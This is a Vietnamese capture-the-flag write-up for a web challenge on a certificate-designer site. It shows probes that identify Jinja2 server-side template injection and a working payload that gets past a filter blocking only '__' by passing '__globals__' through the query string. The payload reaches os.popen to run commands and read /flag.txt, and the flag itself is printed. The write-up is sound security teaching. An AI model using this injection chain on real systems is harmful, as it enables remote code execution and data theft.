# Merged — Web (Medium)

**Flag:** `WEBVERSE{8ba2f569dafeedea7f4f6848757e1917}`

## Đề bài

Certmarq là nền tảng phát chứng chỉ khoá học: thiết kế mẫu một lần, merge thông tin từng học viên,
rồi phát hành hàng loạt. Điểm mấu chốt của đề: trình design render chứng chỉ trên server của họ
để issuer xem trước, và "nó tin người thiết kế hơi nhiều so với mức nên tin".

## Phân tích ban đầu

Đăng ký issuer không cần xác minh email, vào thẳng `/designer`. Trang có ghi rõ:
*"every template runs through our content filter before it renders"* - tức đề biết có SSTI và đã đặt
bộ lọc chặn.

Sink là `POST /designer/preview` với duy nhất field `body`. Fingerprint engine:

| Probe | Kết quả |
| --- | --- |
| `{{7*7}}` | `49` |
| `{{7*'7'}}` | `7777777` -> Jinja2 (Twig cho `77`) |
| `${7*7}` | giữ nguyên -> không phải Twig/EJS |
| `{{ ''\|class }}` | `TemplateAssertionError` -> cú pháp filter của Jinja |
| `{{config.items()}}` | in toàn bộ Flask config |
| `{{ ''.__class__ }}` | bị chặn: *the pattern "__" is not allowed* |

Điểm đáng giá nhất: bộ lọc chỉ tìm một chuỗi duy nhất là `__`. Nó chặn mọi chuỗi literal chứa dunder
trong template, nhưng không nhìn query string.

## Chuỗi khai thác

Ý tưởng: giữ cho template không chứa `__` nào, còn tên dunder thật thì đưa vào từ bên ngoài qua
`request.args`:

```jinja
{{(lipsum|attr(request.args.g))['os'].popen(request.args.c).read()}}
```

- `lipsum` là global có sẵn trong Jinja2; `attr(request.args.g)` với `g=__globals__` lấy dict toàn cục
  của module `jinja2.utils`, trong đó có `os` đã được import.
- `['os'].popen(request.args.c).read()` chạy lệnh và trả output vào trang preview.
- Body gửi đi không hề chứa `__`, nên qua được filter; `__globals__` nằm ở query string, nơi filter
  không chạm tới.

Kiểm chứng bằng `c=id`: `uid=33(www-data)`. Sau đó `c=cat /flag.txt` cho cờ. Đọc thêm
`/entrypoint.sh` thì đề tự xác nhận: *"Direct, unsandboxed Jinja2 SSTI ... a standard Jinja2 RCE chain
reads /flag.txt"*.

Payload đầy đủ kèm cách gọi bằng `fetch()` nằm trong `analysis/payload.md`.

## Flag
```
WEBVERSE{8ba2f569dafeedea7f4f6848757e1917}
```

Bài này không có `exploit.py` tái chạy được. Script `requests` đã viết nhưng chưa một
lần chạy thành công: khi thử lại thì instance đã bị stop (WebVerse chỉ chạy một
instance cùng lúc), và tên field thật của form đăng ký cũng chưa kịp xác nhận. Thứ
được kiểm chứng là chuỗi payload kèm snippet JS trong `analysis/payload.md`, chạy
ngay trên tab của chính instance.
